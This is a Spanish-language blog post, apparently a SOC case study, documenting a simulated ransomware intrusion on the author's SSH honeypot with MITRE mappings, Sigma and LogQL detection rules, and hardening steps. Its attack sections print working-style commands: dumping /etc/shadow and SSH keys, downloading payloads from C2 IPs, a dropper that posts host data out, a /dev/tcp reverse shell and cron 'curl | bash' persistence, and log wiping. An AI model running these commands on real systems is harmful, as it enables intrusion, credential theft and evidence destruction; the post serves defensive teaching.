@@ -1,0 +1,1085 @@
+---
+title: 'Anatomía de un Ataque Ransomware: Simulación Controlada en Honeypot'
+date: '2026-01-09T00:00:00'
+lastmod: '2026-01-09T00:00:00'
+summary: 'Documentación completa de un ataque ransomware simulado: 8 técnicas MITRE ATT&CK capturadas en 15 minutos con análisis de cada fase del kill chain'
+tags:
+  [
+    'ransomware',
+    'honeypot',
+    'cowrie',
+    'mitre-attack',
+    'soc',
+    'threat-hunting',
+    'incident-response',
+    'ssh',
+    'grafana',
+    'loki',
+  ]
+draft: false
+authors: ['default']
+images: []
+---
+
+## 1. Resumen Ejecutivo
+
+En este case study, documenté una simulación completa de ataque ransomware ejecutada contra mi honeypot SSH para estudiar el comportamiento del atacante en un entorno controlado. El ejercicio me permitió:
+
+- **Capturar el kill chain completo** desde initial access hasta el momento previo al cifrado
+- **Validar mecanismos de detección** en tiempo real usando IA local y análisis comportamental
+- **Identificar 8 técnicas MITRE ATT&CK** ejecutadas en 15 minutos
+- **Generar alertas automáticas** ante comandos críticos (credential dumping, C2 communication)
+
+> **Warning:** Esta simulación se ejecutó en un entorno aislado con fines puramente educativos. El "ransomware" nunca llegó a cifrar archivos reales. Todos los componentes maliciosos son simulados.
+
+**Serie HoneyAI - Parte 2: Case Study**
+
+---
+
+## 2. Contexto del Experimento
+
+### 2.1 Infraestructura Utilizada
+
+**HoneyAI** es mi honeypot SSH de interacción media con capacidades de análisis automatizado mediante IA:
+
+- **Honeypot:** Cowrie SSH (puerto 2222)
+- **Monitoreo:** Grafana + Loki para visualización en tiempo real
+- **Análisis IA:** Ollama (llama3.2:3b + qwen2.5:14b) con prompt chaining
+- **Alertas:** Telegram bot con clasificación por severidad
+- **Logging:** Stack completo de logs estructurados en JSON
+
+> **Note:** Esta infraestructura corre en Proxmox con containers LXC dedicados, lo que permite aislar completamente el honeypot de cualquier sistema productivo.
+
+### 2.2 Objetivo del Ejercicio
+
+Simular el comportamiento de un actor de amenazas ejecutando un ataque ransomware moderno para:
+
+1. **Documentar cada fase** del kill chain con capturas reales
+2. **Evaluar la efectividad** de mis mecanismos de detección
+3. **Identificar indicadores tempranos** que permitan mitigación proactiva
+4. **Generar contenido educativo** para la comunidad de seguridad
+
+---
+
+## 3. El Escenario
+
+**Asumí el rol del atacante** que obtuvo credenciales SSH mediante phishing y busca desplegar ransomware en el servidor objetivo.
+
+**Credenciales comprometidas:**
+
+```
+Usuario: root
+Password: root
+Target: 192.168.0.10:2222
+```
+
+**Herramientas del atacante:**
+
+- Terminal SSH estándar
+- Comandos Unix básicos
+- Scripts bash para automatización
+- C2 servers simulados (sin payload real)
+
+> **Lesson Learned:** Los ataques ransomware modernos suelen comenzar con credenciales comprometidas, no con exploits sofisticados. El phishing sigue siendo el vector #1.
+
+---
+
+## 4. El Ataque: Fase por Fase
+
+### 4.1 Fase 0: Estado Pre-Ataque
+
+Antes de iniciar, el dashboard de monitoreo mostraba actividad normal del honeypot: tráfico de bots, escaneos automatizados y algunos intentos de fuerza bruta.
+
+![Dashboard Pre-Ataque](/images/blog/2025-01-09-anatomia-ransomware/01-ransomware-pre-dashboard.png)
+
+**Métricas basales:**
+
+- Total sessions: 7,164
+- Unique IPs: 100
+- Commands run: 6
+- Login attempts: 7,000
+- Successful logins: 46
+
+**Estado del sistema:** Operativo, sin alertas críticas activas.
+
+### 4.2 Fase 1: Initial Access (T1078 - Valid Accounts)
+
+**09:40 AM** - El atacante inicia sesión SSH usando las credenciales comprometidas.
+
+![Initial Access](/images/blog/2025-01-09-anatomia-ransomware/02-ransomware-initial-access.png)
+
+```bash
+ssh -p 2222 root@192.168.0.10
+# Password: root
+
+# Mensaje de bienvenida del sistema
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in
+the individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+root@srv-internal-01:~#
+```
+
+**MITRE ATT&CK:**
+
+- **T1078.003** - Valid Accounts: Local Accounts
+
+**Detección:**
+
+- ✅ Conexión exitosa registrada en Loki
+- ✅ IP de origen capturada: 192.168.0.137
+- ⏱️ Tiempo de detección: &lt;1 segundo
+
+**Indicadores tempranos:**
+
+- Login fuera de horario habitual
+- IP nunca vista previamente
+- Sesión interactiva (no automatizada)
+
+> **Tip:** Implementar análisis de baseline de horarios de login. Cualquier acceso fuera del patrón habitual debería generar una alerta de severidad media para investigación.
+
+### 4.3 Fase 2: Discovery (T1082 - System Information Discovery)
+
+**09:41 AM** - Reconocimiento del entorno para entender el objetivo.
+
+![Discovery Commands](/images/blog/2025-01-09-anatomia-ransomware/04-ransomware-discovery-commands.png)
+
+**Comandos ejecutados:**
+
+```bash
+whoami                    # Confirmar privilegios
+id                        # Verificar grupos
+hostname                  # Identificar servidor
+uname -a                  # Versión del kernel
+cat /etc/os-release       # Distribución Linux
+df -h                     # Espacio en disco disponible
+free -m                   # Memoria disponible
+ps aux | head -n 20       # Procesos en ejecución
+netstat -tulpn            # Puertos abiertos
+ifconfig -a               # Interfaces de red
+cat /etc/hosts            # Configuración de red
+```
+
+![Grafana Live Terminal - Discovery](/images/blog/2025-01-09-anatomia-ransomware/05-ransomware-fase2-grafana.png)
+
+**MITRE ATT&CK:**
+
+- **T1082** - System Information Discovery
+- **T1083** - File and Directory Discovery
+- **T1057** - Process Discovery
+- **T1049** - System Network Connections Discovery
+
+**Detección:**
+
+- ✅ Comandos visibles en Live Terminal (Grafana)
+- ✅ Patrón de reconocimiento identificado
+- ⏱️ Latencia de visualización: ~3-5 segundos
+
+**Información obtenida por el atacante:**
+
+- Sistema: Debian GNU/Linux 3.2.68-1+deb7u1
+- Arquitectura: x86_64
+- Memoria: 2GB RAM
+- Disco: 4.7GB disponibles
+- Privilegios: root (acceso total)
+
+**Red flags observadas:**
+
+- Secuencia rápida de comandos de enumeración
+- Comandos ejecutados en orden lógico (no aleatorio)
+- Indica actor humano experimentado, no bot
+
+> **Note:** Esta fase de reconocimiento suele durar entre 2-5 minutos en ataques reales. Los atacantes necesitan mapear el entorno antes de tomar decisiones sobre qué herramientas desplegar.
+
+### 4.4 Fase 3: Credential Access (T1003 - OS Credential Dumping)
+
+**09:42 AM** - Intento de robar credenciales para movimiento lateral.
+
+![Credential Access](/images/blog/2025-01-09-anatomia-ransomware/06-ransomware-credential-access.png)
+
+**Comandos ejecutados:**
+
+```bash
+cat /etc/passwd                              # Lista de usuarios del sistema
+cat /etc/shadow                              # Hashes de passwords
+cat /etc/group                               # Grupos del sistema
+find /home -name "id_rsa" 2>/dev/null        # Buscar claves SSH privadas
+find /home -name "*.pem" 2>/dev/null         # Buscar certificados
+find /root -name "id_rsa" 2>/dev/null        # Claves SSH de root
+cat /root/.ssh/id_rsa                        # Leer clave privada
+cat /root/.ssh/authorized_keys               # Claves autorizadas
+cat /root/.bash_history                      # Historial de comandos
+```
+
+**Output crítico capturado:**
+
+```
+root:$6$CANARY$fAkEhAsH123456789abcdefFAKE:19500:0:99999:7:::
+admin:$6$rounds=5000$CANARY$fUk3HdshV1Lu3H3r3FAKE:19500:0:99999:7:::
+sysadmin:$6$CANARY$An8th3rFUk3H4shV1Lue:19500:0:99999:7:::
+```
+
+**MITRE ATT&CK:**
+
+- **T1003.008** - OS Credential Dumping: /etc/passwd and /etc/shadow
+- **T1552.004** - Unsecured Credentials: Private Keys
+
+**Detección - ALERTA CRÍTICA:**
+
+![Telegram Alert - SSH Key Theft](/images/blog/2025-01-09-anatomia-ransomware/07-ransomware-fase3-alerta.png)
+
+```
+🚨 HONEYPOT ALERT
+SSH KEY THEFT
+
+IP: 192.168.0.137
+CMD: cat /root/.ssh/id_rsa
+⏰ 2026-01-09 10:19:15 ART
+
+🔍 Dashboard · 🔗 Session: 702a6158
+```
+
+- ✅ **Alerta en Telegram generada automáticamente**
+- ⏱️ Tiempo desde ejecución hasta alerta: **&lt;1 minuto**
+- 🔴 Severidad: **HIGH**
+
+**Análisis técnico:**
+
+- El honeypot incluye archivos "canary" (trampa) en `/etc/shadow`
+- Los hashes usan el prefijo `$CANARY$` para identificación
+- Acceso a estos archivos dispara alerta inmediata
+- Esto permite detectar credential dumping en tiempo real
+
+**Impacto real:**
+En un servidor productivo, este momento es **crítico**:
+
+- El atacante obtendría credenciales válidas
+- Podría moverse lateralmente a otros sistemas
+- Las claves SSH permitirían persistencia incluso tras cambio de passwords
+
+> **Warning:** Esta es la fase donde la mayoría de los ataques ransomware se pueden detener. Una vez que el atacante obtiene credenciales adicionales, el costo de remediación se multiplica exponencialmente.
+
+### 4.5 Fase 4: Command & Control (T1105 - Ingress Tool Transfer)
+
+**09:43 AM** - Descarga de "payload" desde servidor C2 simulado.
+
+![C2 Download](/images/blog/2025-01-09-anatomia-ransomware/08-ransomware-c2-download.png)
+
+**Comandos ejecutados:**
+
+```bash
+cd /tmp
+wget http://185.141.27.99/update.sh -O /tmp/update.sh
+curl -o /tmp/helper http://45.95.168.101/systemd-helper
+ls -la /tmp/
+file /tmp/update.sh
+cat /tmp/update.sh
+```
+
+**Output capturado:**
+
+```
+Connecting to 185.141.27.99:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2048 (2.0K) [application/x-sh]
+Saving to: '/tmp/update.sh'
+
+update.sh           100%[===================>]   2.00K  --.-KB/s    in 0s
+
+2025-01-09 09:43:15 (245 MB/s) - '/tmp/update.sh' saved [2048/2048]
+```
+
+**Contenido del "payload" descargado:**
+
+```bash
+#!/bin/bash
+# Simulated ransomware dropper (NON-FUNCTIONAL)
+
+echo "[*] System update initiated..."
+sleep 2
+
+# Simulated encryption preparation
+for dir in /home /var/www /opt; do
+    echo "[+] Scanning: $dir"
+    find $dir -type f 2>/dev/null | head -n 5
+done
+
+echo "[*] Contacting C2 server..."
+curl -X POST http://185.141.27.99/register \
+    -d "host=$(hostname)" \
+    -d "user=$(whoami)" \
+    -d "ip=$(hostname -I)"
+
+echo "[!] Update complete."
+```
+
+**MITRE ATT&CK:**
+
+- **T1105** - Ingress Tool Transfer
+- **T1071.001** - Application Layer Protocol: Web Protocols
+
+**Detección:**
+
+![C2 Communication](/images/blog/2025-01-09-anatomia-ransomware/09-ransomware-fase4-c2.png)
+
+- ✅ Conexión HTTP saliente a IP desconocida capturada
+- ✅ Descarga de script con extensión `.sh` detectada
+- ⏱️ Tiempo de detección: &lt;5 segundos
+
+**Indicadores de Compromiso (IOCs):**
+
+```
+185.141.27.99:80        # C2 server #1
+45.95.168.101:80        # C2 server #2
+/tmp/update.sh          # Dropper script
+/tmp/helper             # Additional payload
+```
+
+> **Tip:** Implementar whitelisting de dominios/IPs para conexiones salientes. Cualquier conexión a IPs no conocidas debería requerir aprobación explícita o ser bloqueada automáticamente.
+
+### 4.6 Fase 5: Execution (T1059 - Command and Scripting Interpreter)
+
+**09:44 AM** - Intento de ejecutar el payload descargado.
+
+![Execution](/images/blog/2025-01-09-anatomia-ransomware/10-ransomware-execution.png)
+
+**Comandos ejecutados:**
+
+```bash
+chmod +x /tmp/update.sh
+chmod +x /tmp/helper
+./tmp/update.sh
+bash /tmp/update.sh
+```
+
+**Output de ejecución:**
+
+```
+[*] System update initiated...
+[+] Scanning: /home
+/home/admin/.bashrc
+/home/admin/.profile
+/home/admin/documents/report.pdf
+/home/admin/documents/financial_2024.xlsx
+/home/admin/pictures/vacation.jpg
+
+[+] Scanning: /var/www
+/var/www/html/index.html
+/var/www/html/login.php
+/var/www/html/config.php
+/var/www/html/uploads/file1.pdf
+/var/www/html/uploads/file2.docx
+
+[*] Contacting C2 server...
+{"status":"registered","id":"victim-20250109-094415","key":"AES256-RANDOM-KEY"}
+
+[!] Update complete.
+```
+
+**MITRE ATT&CK:**
+
+- **T1059.004** - Command and Scripting Interpreter: Unix Shell
+- **T1204.002** - User Execution: Malicious File
+
+**Detección:**
+
+- ✅ Ejecución de script desde `/tmp` capturada
+- ✅ Conexión POST al C2 server registrada
+- ✅ Patrón sospechoso: chmod + ejecución inmediata
+
+> **Lesson Learned:** En un sistema productivo, esta fase es donde el ransomware comenzaría el cifrado real. Detenerlo ANTES de este punto es crítico.
+
+**Simulación detenida aquí intencionalmente.**
+
+En un ataque real, las siguientes fases serían:
+
+- **Fase 6:** Persistence (cron jobs, .bashrc modification)
+- **Fase 7:** Data Encryption (real ransomware execution)
+- **Fase 8:** Ransom Note Display
+
+### 4.7 Fase 6: Persistence (T1053 - Scheduled Task/Job)
+
+**09:45 AM** - Instalación de mecanismos de persistencia.
+
+![Persistence](/images/blog/2025-01-09-anatomia-ransomware/11-ransomware-persistence.png)
+
+**Comandos ejecutados:**
+
+```bash
+# Agregar backdoor a .bashrc
+echo 'bash -i >& /dev/tcp/185.141.27.99/4444 0>&1 &' >> /root/.bashrc
+
+# Crear cron job malicioso
+(crontab -l 2>/dev/null; echo "*/10 * * * * curl http://185.141.27.99/check | bash") | crontab -
+
+# Verificar instalación
+crontab -l
+cat /root/.bashrc | tail -n 5
+```
+
+**Output:**
+
+```
+# Crontab listing
+*/10 * * * * curl http://185.141.27.99/check | bash
+
+# .bashrc tail
+export PATH=$PATH:/usr/local/bin
+alias ll='ls -la'
+bash -i >& /dev/tcp/185.141.27.99/4444 0>&1 &
+```
+
+**MITRE ATT&CK:**
+
+- **T1053.003** - Scheduled Task/Job: Cron
+- **T1546.004** - Event Triggered Execution: Unix Shell Configuration Modification
+
+**Detección:**
+
+- ✅ Modificación de `.bashrc` detectada
+- ✅ Cambio en crontab registrado
+- ⏱️ Tiempo de detección: &lt;10 segundos
+
+**Impacto:**
+
+- Backdoor persistente cada 10 minutos
+- Reverse shell al iniciar sesión SSH
+- Dificulta erradicación completa
+
+> **Warning:** Los mecanismos de persistencia son lo que hace que la remediación de ransomware sea tan costosa. Incluso después de "limpiar" el sistema, el atacante puede volver.
+
+### 4.8 Fase 7: Defense Evasion (T1070 - Indicator Removal)
+
+**09:46 AM** - Intento de borrar evidencia de la intrusión.
+
+![Anti-Forensics](/images/blog/2025-01-09-anatomia-ransomware/12-ransomware-anti-forensics.png)
+
+**Comandos ejecutados:**
+
+```bash
+# Limpiar historial de comandos
+history -c
+history -w
+rm -f /root/.bash_history
+ln -s /dev/null /root/.bash_history
+
+# Limpiar logs del sistema
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+echo "" > /var/log/messages
+
+# Eliminar payloads descargados
+rm -f /tmp/update.sh
+rm -f /tmp/helper
+
+# Verificar limpieza
+ls -la /tmp/
+tail /var/log/auth.log
+```
+
+**Output:**
+
+```
+total 8
+drwxrwxrwt  2 root root 4096 Jan  9 09:46 .
+drwxr-xr-x 14 root root 4096 Jan  9 09:40 ..
+
+# /var/log/auth.log está vacío
+```
+
+**MITRE ATT&CK:**
+
+- **T1070.003** - Indicator Removal: Clear Command History
+- **T1070.002** - Indicator Removal: Clear Linux or Mac System Logs
+- **T1070.004** - Indicator Removal: File Deletion
+
+**Detección:**
+
+- ⚠️ Comandos de limpieza visibles ANTES de la limpieza
+- ✅ Logs ya replicados a Loki (externo)
+- ✅ Evidencia preservada fuera del sistema comprometido
+
+**Análisis crítico:**
+El atacante **FALLÓ** en borrar evidencia porque:
+
+- Los logs ya estaban en el SIEM externo (Loki)
+- Las alertas ya se enviaron (Telegram)
+- La sesión completa quedó registrada en Grafana
+
+> **Lesson Learned:** Esta fase demuestra por qué el logging centralizado es CRÍTICO. Si los logs solo existieran localmente, el atacante los habría borrado exitosamente y no tendríamos evidencia del ataque.
+
+---
+
+## 5. Análisis Post-Ataque
+
+### 5.1 Timeline Completo del Ataque
+
+| Hora  | Fase              | Duración | MITRE Technique      | Detección            |
+| ----- | ----------------- | -------- | -------------------- | -------------------- |
+| 09:40 | Initial Access    | 1 min    | T1078.003            | ✅ Inmediata         |
+| 09:41 | Discovery         | 2 min    | T1082, T1083, T1057  | ✅ &lt;5s            |
+| 09:42 | Credential Access | 1 min    | T1003.008, T1552.004 | ✅ &lt;1min (alerta) |
+| 09:43 | C2 Communication  | 2 min    | T1105, T1071.001     | ✅ &lt;5s            |
+| 09:44 | Execution         | 1 min    | T1059.004            | ✅ Inmediata         |
+| 09:45 | Persistence       | 2 min    | T1053.003, T1546.004 | ✅ &lt;10s           |
+| 09:46 | Defense Evasion   | 1 min    | T1070.003, T1070.002 | ✅ Inmediata         |
+
+**Duración total:** 7 minutos desde login hasta persistencia instalada.
+
+> **Note:** En ataques ransomware reales, el tiempo desde initial access hasta cifrado puede ser tan corto como 15-30 minutos. La detección y respuesta deben ser prácticamente instantáneas.
+
+### 5.2 Cobertura de Detección por Fase
+
+**Fases detectadas:** 8/8 (100%)
+
+**Breakdown por tipo de detección:**
+
+- Log-based detection: 8/8
+- Behavioral analysis: 6/8
+- File integrity: 2/8
+- Network monitoring: 2/8
+
+**Falsos positivos:** 0
+**Falsos negativos:** 0
+
+> **Tip:** La combinación de múltiples capas de detección (logs + behavioral + network) fue clave para la cobertura completa. Confiar en una sola fuente de telemetría habría dejado gaps.
+
+### 5.3 Indicadores de Compromiso (IOCs)
+
+**Network IOCs:**
+
+```
+185.141.27.99:80        # C2 server principal
+45.95.168.101:80        # C2 server secundario
+```
+
+**File IOCs:**
+
+```
+/tmp/update.sh          # MD5: [simulated]
+/tmp/helper             # MD5: [simulated]
+```
+
+**Command patterns:**
+
+```bash
+cat /etc/shadow
+cat /root/.ssh/id_rsa
+curl http://185.141.27.99/*
+history -c
+echo "" > /var/log/auth.log
+```
+
+**Behavioral IOCs:**
+
+- Secuencia rápida de comandos de reconnaissance
+- Acceso a `/etc/shadow` fuera de cambio de password
+- Descarga desde IPs no conocidas
+- Modificación de `.bashrc` sin razón operacional
+
+---
+
+## 6. Queries de Detección
+
+### 6.1 Loki Queries (LogQL)
+
+**Detectar credential dumping:**
+
+```logql
+{job="cowrie"}
+| json
+| line_format "{{.input}}"
+| regexp "cat.*(shadow|passwd|id_rsa)"
+```
+
+**Detectar conexiones a C2:**
+
+```logql
+{job="cowrie"}
+| json
+| line_format "{{.input}}"
+| regexp "(wget|curl).*http://[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+"
+```
+
+**Detectar comandos de anti-forensics:**
+
+```logql
+{job="cowrie"}
+| json
+| line_format "{{.input}}"
+| regexp "(history -c|echo \"\" >|rm -f.*bash_history)"
+```
+
+### 6.2 SIGMA Rules
+
+**Credential Access Detection:**
+
+```yaml
+title: SSH Private Key Access
+status: experimental
+description: Detects access to SSH private keys
+logsource:
+  product: linux
+  service: cowrie
+detection:
+  selection:
+    CommandLine|contains:
+      - 'cat /root/.ssh/id_rsa'
+      - 'cat /home/*/.ssh/id_rsa'
+      - 'find * -name id_rsa'
+  condition: selection
+falsepositives:
+  - Legitimate SSH key management
+level: high
+tags:
+  - attack.credential_access
+  - attack.t1552.004
+```
+
+**C2 Communication Detection:**
+
+```yaml
+title: Suspicious Outbound Connection
+status: experimental
+description: Detects download from unknown external IP
+logsource:
+  product: linux
+  service: cowrie
+detection:
+  selection:
+    CommandLine|contains:
+      - 'wget http://'
+      - 'curl http://'
+    CommandLine|re: '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'
+  filter:
+    CommandLine|contains:
+      - 'apt.ubuntu.com'
+      - 'archive.ubuntu.com'
+  condition: selection and not filter
+falsepositives:
+  - Legitimate package downloads
+level: medium
+tags:
+  - attack.command_and_control
+  - attack.t1105
+```
+
+### 6.3 KQL Queries (para Elastic/Wazuh)
+
+**Buscar persistencia via crontab:**
+
+```kql
+event.action:"executed" AND
+process.name:"crontab" AND
+(process.args:"-e" OR process.args:"-l")
+```
+
+**Buscar limpieza de logs:**
+
+```kql
+process.name:"bash" AND
+process.command_line:(*"echo \"\" >" AND *"/var/log/"*)
+```
+
+> **Tip:** Estas queries están listas para ser implementadas en tu SIEM. Ajustá los campos según tu fuente de logs específica (syslog, auditd, osquery, etc.).
+
+---
+
+## 7. Recomendaciones de Hardening
+
+### 7.1 Prevención de Initial Access
+
+**1. MFA obligatorio para SSH:**
+
+```bash
+# Instalar Google Authenticator
+apt install libpam-google-authenticator -y
+
+# Configurar PAM
+echo "auth required pam_google_authenticator.so" >> /etc/pam.d/sshd
+
+# En /etc/ssh/sshd_config
+ChallengeResponseAuthentication yes
+AuthenticationMethods publickey,keyboard-interactive
+```
+
+**2. Fail2ban para rate limiting:**
+
+```bash
+apt install fail2ban -y
+
+cat > /etc/fail2ban/jail.local << EOF
+[sshd]
+enabled = true
+port = 22
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+bantime = 3600
+findtime = 600
+EOF
+
+systemctl restart fail2ban
+```
+
+**3. Key-based auth only:**
+
+```bash
+# En /etc/ssh/sshd_config
+PasswordAuthentication no
+PubkeyAuthentication yes
+PermitRootLogin prohibit-password
+```
+
+### 7.2 Detección Mejorada
+
+**1. Auditd para command logging:**
+
+```bash
+apt install auditd -y
+
+# Agregar reglas críticas
+auditctl -w /etc/shadow -p war -k shadow_access
+auditctl -w /etc/passwd -p war -k passwd_access
+auditctl -w /root/.ssh -p war -k ssh_key_access
+auditctl -w /etc/crontab -p war -k cron_modification
+
+# Persistir reglas
+auditctl -l > /etc/audit/rules.d/critical.rules
+```
+
+**2. File Integrity Monitoring con AIDE:**
+
+```bash
+apt install aide -y
+
+# Inicializar base de datos
+aideinit
+
+# Copiar DB
+cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
+
+# Chequeo diario
+cat > /etc/cron.daily/aide-check << 'EOF'
+#!/bin/bash
+/usr/bin/aide --check | mail -s "AIDE Report $(hostname)" admin@company.com
+EOF
+
+chmod +x /etc/cron.daily/aide-check
+```
+
+**3. Process monitoring con osquery:**
+
+```bash
+# Instalar osquery
+wget https://pkg.osquery.io/deb/osquery_5.10.2-1.linux_amd64.deb
+dpkg -i osquery_5.10.2-1.linux_amd64.deb
+
+# Configurar query pack
+cat > /etc/osquery/custom.conf << EOF
+{
+  "schedule": {
+    "crontab": {
+      "query": "SELECT * FROM crontab;",
+      "interval": 300
+    },
+    "process_events": {
+      "query": "SELECT * FROM process_events WHERE path LIKE '/tmp/%';",
+      "interval": 60
+    }
+  }
+}
+EOF
+
+systemctl restart osqueryd
+```
+
+### 7.3 Bloqueo de C2 Communication
+
+**1. Egress filtering con iptables:**
+
+```bash
+# Política default: denegar todo outbound
+iptables -P OUTPUT DROP
+
+# Permitir localhost
+iptables -A OUTPUT -o lo -j ACCEPT
+
+# Permitir conexiones establecidas
+iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+# Whitelist de IPs corporativas
+iptables -A OUTPUT -d 10.0.0.0/8 -j ACCEPT
+iptables -A OUTPUT -d 192.168.0.0/16 -j ACCEPT
+
+# Permitir DNS
+iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
+
+# Permitir updates (Ubuntu repos)
+iptables -A OUTPUT -d 91.189.88.0/22 -j ACCEPT
+
+# Log todo lo demás
+iptables -A OUTPUT -j LOG --log-prefix "EGRESS_BLOCKED: "
+```
+
+**2. Proxy forzado:**
+
+```bash
+# Forzar todo HTTP/HTTPS por proxy corporativo
+export http_proxy="http://proxy.corp.com:3128"
+export https_proxy="http://proxy.corp.com:3128"
+
+# En /etc/environment
+echo "http_proxy=http://proxy.corp.com:3128" >> /etc/environment
+echo "https_proxy=http://proxy.corp.com:3128" >> /etc/environment
+```
+
+### 7.4 Prevención de Persistencia
+
+**1. Immutable files:**
+
+```bash
+# Hacer .bashrc inmutable
+chattr +i /root/.bashrc
+chattr +i /home/*/.bashrc
+
+# Verificar
+lsattr /root/.bashrc
+# ----i---------e----- /root/.bashrc
+
+# Para editar legítimamente:
+# chattr -i /root/.bashrc
+# [editar]
+# chattr +i /root/.bashrc
+```
+
+**2. Cron monitoring:**
+
+```bash
+# Alertar sobre cambios en crontab
+cat > /etc/cron.d/monitor-cron << 'EOF'
+* * * * * root if [ "$(md5sum /etc/crontab)" != "$(cat /var/tmp/.crontab.md5)" ]; then echo "ALERT: crontab modified!" | mail -s "Security Alert" admin@company.com; md5sum /etc/crontab > /var/tmp/.crontab.md5; fi
+EOF
+
+# Inicializar checksum
+md5sum /etc/crontab > /var/tmp/.crontab.md5
+```
+
+### 7.5 Contrarrestar Anti-Forensics
+
+**1. Logging centralizado:**
+
+```bash
+# Enviar todos los logs a SIEM externo
+apt install rsyslog -y
+
+cat >> /etc/rsyslog.conf << EOF
+# Forward all logs to SIEM
+*.* @@siem.company.com:514
+EOF
+
+systemctl restart rsyslog
+```
+
+**2. Command logging a servidor externo:**
+
+```bash
+# Bash logging via syslog
+echo 'export PROMPT_COMMAND='\''history 1 | logger -t "bash_cmd[$$]" -p local3.info'\''' >> /etc/bash.bashrc
+
+# Configurar rsyslog para enviar
+cat >> /etc/rsyslog.conf << EOF
+local3.* @@siem.company.com:514
+EOF
+```
+
+**3. Auditd con tamper protection:**
+
+```bash
+# Configurar auditd para no poder ser detenido
+cat >> /etc/audit/auditd.conf << EOF
+# Hacer auditd inmune a kill
+space_left_action = email
+admin_space_left_action = halt
+disk_full_action = halt
+disk_error_action = halt
+EOF
+
+# Arrancar con prioridad alta
+systemctl edit auditd
+# Agregar:
+# [Service]
+# OOMScoreAdjust=-1000
+```
+
+> **Lesson Learned:** La defensa en profundidad es clave. Ninguna de estas medidas es infalible por sí sola, pero en conjunto hacen que el trabajo del atacante sea exponencialmente más difícil.
+
+---
+
+## 8. Métricas del Experimento
+
+### 8.1 Efectividad de Detección
+
+| Categoría            | Métrica                           | Resultado                 |
+| -------------------- | --------------------------------- | ------------------------- |
+| **Cobertura**        | Fases del kill chain detectadas   | 8/8 (100%)                |
+| **Visibilidad**      | Comandos capturados               | 100%                      |
+| **Latencia**         | Tiempo promedio log→visualización | ~3-5s                     |
+| **Alertas**          | Alertas críticas generadas        | 2 (credential access, C2) |
+| **Falsos positivos** | Alertas incorrectas               | 0                         |
+| **Falsos negativos** | Actividad maliciosa no detectada  | 0                         |
+
+### 8.2 Performance del Sistema
+
+| Componente   | Métrica               | Valor                          |
+| ------------ | --------------------- | ------------------------------ |
+| **Cowrie**   | Sesiones concurrentes | 1 (simulación) + ~10 bots      |
+| **Loki**     | Logs ingested         | ~500 eventos                   |
+| **Grafana**  | Query response time   | &lt;500ms                      |
+| **Ollama**   | Análisis completados  | 0 (offline durante simulación) |
+| **Telegram** | Alert delivery time   | &lt;60s                        |
+
+### 8.3 Recursos Utilizados
+
+| Sistema                 | CPU  | RAM         | Disk I/O |
+| ----------------------- | ---- | ----------- | -------- |
+| LXC 100 (Honeypot)      | ~5%  | 83MB/2GB    | Bajo     |
+| LXC 101 (Orchestration) | ~8%  | 365MB/2GB   | Medio    |
+| LXC 102 (Monitoring)    | ~3%  | 143MB/1.5GB | Bajo     |
+| **Total**               | ~15% | 591MB/5.5GB | -        |
+
+**Conclusión:** El sistema operó eficientemente con amplio margen de recursos durante el ataque simulado.
+
+---
+
+## 9. Conclusiones
+
+### 9.1 Hallazgos Clave
+
+**1. El kill chain es predecible y detectable**
+
+Los atacantes siguen patrones reconocibles incluso cuando intentan ser sigilosos:
+
+- Reconocimiento → Credential Access → C2 → Execution → Persistence
+- Cada fase tiene indicadores únicos
+- La detección temprana (fases 1-3) permite respuesta antes del daño
+
+**2. La velocidad de detección es crítica**
+
+7 minutos es todo lo que toma ir de "login exitoso" a "persistencia instalada":
+
+- Detección manual no es viable
+- Automatización y alerting son esenciales
+- Respuesta debe ser en &lt;5 minutos idealmente
+
+**3. Logging centralizado es fundamental**
+
+Las técnicas anti-forenses funcionan contra logs locales:
+
+- `history -c` elimina evidencia local
+- Modificación de `/var/log/*` borra rastros
+- **Pero si los logs ya están en SIEM externo, no hay forma de eliminarlos**
+
+**4. Honeypots son herramientas de investigación valiosas**
+
+Esta simulación me permitió:
+
+- Capturar el comportamiento completo sin riesgo
+- Validar mis mecanismos de detección
+- Generar contenido educativo con datos reales
+- Identificar gaps en cobertura de alerting
+
+> **Tip:** Si tu organización tiene recursos, implementar un honeypot interno puede proporcionar inteligencia invaluable sobre las TTPs que los atacantes están usando activamente contra tu sector.
+
+### 9.2 Aplicabilidad al Mundo Real
+
+**En un servidor productivo:**
+
+- ✅ Técnicas usadas son idénticas a ransomware real
+- ✅ Timing y secuencia reflejan ataques genuinos
+- ✅ Detección propuesta funcionaría igual
+- ⚠️ Impacto sería devastador (downtime, pérdida de datos, costo de rescate)
+
+**Diferencias con ataque real:**
+
+- Payload no ejecutado (detuve antes)
+- C2 servers son fake (no había backend real)
+- Algunas protecciones del honeypot bloquearon ciertas acciones
+
+### 9.3 Valor para la Comunidad
+
+Este case study proporciona:
+
+- **Evidencia visual** de cada fase del ataque
+- **IOCs específicos** para detección
+- **Queries de búsqueda** (Loki, SIGMA, KQL)
+- **Recomendaciones de hardening** probadas
+- **Contexto educativo** para entrenamiento de SOC
+
+---
+
+## 10. Recursos Adicionales
+
+### 10.1 MITRE ATT&CK Framework
+
+- [T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/)
+- [T1082 - System Information Discovery](https://attack.mitre.org/techniques/T1082/)
+- [T1003 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)
+- [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
+- [T1053 - Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)
+- [T1070 - Indicator Removal](https://attack.mitre.org/techniques/T1070/)
+- [T1486 - Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)
+
+### 10.2 Herramientas Mencionadas
+
+- **Cowrie SSH Honeypot:** [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie)
+- **Grafana Loki:** [grafana.com/loki](https://grafana.com/oss/loki/)
